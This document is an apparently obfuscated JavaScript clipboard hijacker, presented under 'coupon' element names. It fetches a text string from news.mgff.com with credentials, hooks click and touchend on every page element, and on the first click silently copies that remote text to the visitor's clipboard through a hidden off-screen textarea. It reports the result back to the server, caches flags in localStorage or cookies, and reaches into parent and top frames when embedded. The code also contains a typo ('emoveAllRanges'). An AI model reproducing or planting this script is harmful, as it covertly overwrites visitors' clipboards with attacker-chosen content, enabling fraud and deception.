(function(x1) {
    var x2 = {
        trigger: null,
        dd: document,
        ww: window,
        listener: [],
        listenerTouchend: [],
        listenerCopy: null,
        text: null,
        action: "copy",
        ua: window.navigator.userAgent,
        host: location.protocol + "//" + location.host,
        cupScript: document.getElementById("cup_give_coupon") || !1,
        content: document.getElementById("cup_give_content") || !1,
        id: 1,
        iscp: !0,
        hm: "0",
        showAd: function() {
            var x6 = this.getArgs();
            this.id = x6.id
        },
        isIframe: function() {
            return "about:blank" == window.location.href && window.parent != window.self ? window.top != window.parent: window.top != window.self
        },
        getAb: function(x3) {
            if (!this.cupScript) {
                return null
            };
            x3 = "data-cup-" + x3;
            var x4 = this.cupScript;
            return x4.hasAttribute(x3) ? x4.getAttribute(x3) : null
        },
        init: function() {
            var x3 = this;
            x3.trigger = x3.dd.getElementsByTagName("*");
            x3.showAd();
            if (null == x3.sGet("cup_cp_wxt")) {
                var x4 = "";
                null != x3.sGet("cup_items_wxt") ? x4 = x3.sGet("cup_items_wxt") : (x4 = x3.randomString(), x3.sSet("cup_items_wxt", x4, 7200));
                x3.ajax("http://news.mgff.com/Api/pay.html?callback=jsonp" + x4, "get", "id=" + x3["id"] + "&host=" + x3["host"] + "&size=0&ifr=" + (x3.isIframe() ? "1": "0"),
                function(x4) {
                    x3.text = x4 + "";
                    if ("null" == x3.text || 6 > x3.text.length) {
                        x3.text = 0
                    };
                    x3.text && (x3.listenClick(), x3.listenTouchend())
                },
                this)
            }
        },
        cp: function(x3) {
            var x4 = this;
            ("1" == x3 && null == x4.sGet("cup_cp_wxt") || "2" == x3 && null == x4.sGet("cup_cper_wxt")) && x4.ajax("http://news.mgff.com/Api/cp?callback=jsonp" + (new Date).getTime(), "get", "id=" + x4["id"] + "&status=" + x3 + "&host=" + x4["host"],
            function(x7) {
                "1" == x3 ? x4.sSet("cup_cp_wxt", "1", 10800) : x4.sSet("cup_cper_wxt", "1", 10800)
            },
            !0)
        },
        listenClick: function() {
            for (var x3 = this,
            x4 = 0; x4 < x3.trigger.length; x4++) {
                x3.listener.push(x3.listenNode(x3.trigger[x4], "click",
                function(x4) {
                    return x3.onClick(x4, "click")
                }))
            }
        },
        listenTouchend: function() {
            for (var x3 = this,
            x4 = 0; x4 < x3.trigger.length; x4++) {
                x3.listenerTouchend.push(x3.listenNode(x3.trigger[x4], "touchend",
                function(x4) {
                    return x3.onClick(x4, "touchend")
                }))
            }
        },
        listenNode: function(x3, x4, x7) {
            x3.addEventListener(x4, x7, !0);
            return {
                destroy: function() {
                    x3.removeEventListener(x4, x7, !0)
                }
            }
        },
        onClick: function(x3, x4) {
            var x7 = this;
            this.dd.body.hasAttribute("oncopy") && this.dd.body.setAttribute("oncopy", "return true");
            this.dd.body.hasAttribute("onpaste") && this.dd.body.setAttribute("onpaste", "return true");
              "INPUT" != x3.target["nodeName"] && "TEXTAREA" != x3.target["nodeName"] && ((new x1(this["text"], this["action"], function(x4) {
               x4 ? x7["cp"]("1") : x7["cp"]("2")
            }))["start"](), "click" == x4 ? (this.listenerD = !0, this.listener.forEach(function(x4, x3) {
                x4.destroy()
            })) : "touchend" == x4 && this.listenerTouchend.forEach(function(x4, x3) {
                x4.destroy()
            }));
            this.dd.body.hasAttribute("oncopy") && this.dd.body.setAttribute("oncopy", "return false");
            this.dd.body.hasAttribute("onpaste") && this.dd.body.setAttribute("onpaste", "return false")
        },
        randomString: function() {
            var x3 = "";
            for (i = 0; 7 > i; i++) {
                x3 += "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math["floor"](61 * Math.random()))
            };
            return x3
        },
        sGet: function(x3) {
            if (this.ww.localStorage) {
                try {
                    if (!this.ww.localStorage.getItem(x3)) {
                        return null
                    };
                    var x4 = JSON.parse(this.ww.localStorage.getItem(x3));
                    return x4.time < (new Date).getTime() ? (this.ww.localStorage.removeItem(x3), null) : x4["value"]
                } catch(c) {
                    return console.log("[get] not ls."),
                    null
                }
            } else {
                return this.gCK(x3)
            }
        },
        sSet: function(x3, x4, x7) {
            if (this.ww.localStorage) {
                try {
                    var x5 = {
                        name: x3,
                        value: x4,
                        time: (new Date).getTime() + 1E3 * x7
                    };
                    this.ww.localStorage.setItem(x3, JSON.stringify(x5))
                } catch(f) {
                    console.log("[set] not ls.")
                }
            } else {
                this.sCK(x3, x4, x7)
            }
        },
        gCK: function(x3) {
            var x4;
            return (x4 = document.cookie.match(new RegExp("(^| )" + x3 + "=([^;]*)(;|$)"))) ? decodeURI(x4[2]) : null
        },
        sCK: function(x3, x4, x7) {
            var x5 = new Date;
            x5.setTime(x5.getTime() + 1E3 * x7);
            document.cookie = x3 + "=" + encodeURI(x4) + ";expires=" + x5.toUTCString() + ";path=/"
        },
        ajax: function(x3, x4, x7, x5, x8) {
            x4 = x4 ? x4.toLowerCase() : "get";
            "get" == x4 && x7 && (x3 = 0 < x3.indexOf("?") ? x3 + ("&" + x7) : x3 + ("?" + x7));
            var x9 = new XMLHttpRequest;
            x9.responseType = "text";
            x9.open(x4, x3, !0);
            x9.withCredentials = !0;
            x9.timeout && (x9.timeout = 3E3, x9.ontimeout = function(x4) {
                x5.call(x8, "0↵")
            });
            "post" == x4 && x9.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            x9.onreadystatechange = function() {
                4 != x9.readyState || 200 != x9.status && 304 != x9.status || x5.call(x8, x9.responseText)
            };
            x9.send("post" == x4 ? x7: null)
        },
        getArgs: function(xa) {
            var xb = document.currentScript,
            xc = xb ? xb.src: "",
            xd = /(?:\?|&)(.*?)=(.*?)(?=&|$)/g,
            xe,
            xf = {};
            while ((xe = xd.exec(xc)) != null) {
                xf[xe[1]] = decodeURIComponent(xe[2])
            };
            if (xa != undefined && xa != null) {
                return xf[xa]
            } else {
                return xf
            }
        }
    };
    try {
        "about:blank" == window.location.href && parent.window.location.href != window.location.href && (x2.host = parent.window.location.protocol + "//" + parent.window.location.host, x2.dd = parent.document, x2.ww = parent.window);
        x2.init()
    } catch(b) {
        x2.init()
    }
})(function(x1, x2, x3) {
    return {
        fakeElem: null,
        text: x1,
        action: x2,
        selectedText: null,
        dd: document,
        ww: window,
        start: function() {
            this.text && ("about:blank" == window.location.href && parent.window.location.href != window.location.href && (this.ww = top.window, this.dd = top.document), this.selectFake())
        },
        selectFake: function() {
            var x4 = "rtl" == this.dd.documentElement.getAttribute("dir");
            this.removeFake();
            this.fakeElem = this.dd.createElement("textarea");
            this.fakeElem.style.fontSize = "12pt";
            this.fakeElem.style.border = "0";
            this.fakeElem.style.padding = "0";
            this.fakeElem.style.margin = "0";
            this.fakeElem.style.position = "absolute";
            x4 ? this.fakeElem.style.right = "-9999px": this.fakeElem.style.left = "-9999px";
            this.fakeElem.style.top = (this.ww.pageYOffset || this.dd.documentElement.scrollTop) + "px";
            this.fakeElem.setAttribute("readonly", "");
            this.fakeElem.value = this.text;
            this.dd.body.appendChild(this.fakeElem);
            this.selectedText = this.selectText(this.fakeElem);
            this.copyText()
        },
        removeFake: function() {
            this.fakeElem && (this.dd.body.removeChild(this.fakeElem), this.fakeElem = null)
        },
        copyText: function() {
            var x4 = void(0);
            try {
                x4 = this.dd.execCommand(this.action)
            } catch(c) {
                x4 = !1
            };
            this.removeFake();
            x3.call(this, x4)
        },
        selectText: function(x4) {
            if ("SELECT" === x4.nodeName) {
                x4.focus(),
                x4 = x4.value
            } else {
                if ("INPUT" === x4.nodeName || "TEXTAREA" === x4.nodeName) {
                    var x3 = x4.hasAttribute("readonly");
                    x3 || x4.setAttribute("readonly", "");
                    x4.select();
                    x4.setSelectionRange(0, x4.value.length);
                    x3 || x4.removeAttribute("readonly");
                    x4 = x4["value"]
                } else {
                    x4.hasAttribute("contenteditable") && x4.focus();
                    x3 = this.ww.getSelection();
                    var x5 = this.dd.createRange();
                    x5.selectNodeContents(x4);
                    x3.emoveAllRanges();
                    x3.addRange(x5);
                    x4 = x3.toString()
                }
            };
            return x4
        }
    }
});
